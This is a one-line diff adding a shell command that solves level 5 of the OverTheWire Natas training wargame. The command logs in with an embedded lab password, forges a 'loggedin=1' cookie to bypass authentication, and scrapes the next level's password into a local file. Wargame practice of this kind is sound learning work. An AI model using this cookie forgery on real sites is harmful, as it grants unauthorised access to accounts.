@@ -1,0 +1,1 @@
+curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK http://natas5.natas.labs.overthewire.org/ -H 'Cookie: loggedin=1' | grep natas6 | cut -d ' ' -f 6,8 | tr ' ' ':' | cut -d '<' -f 1 >> ~/otw-labs/natas/passwds/6.txt
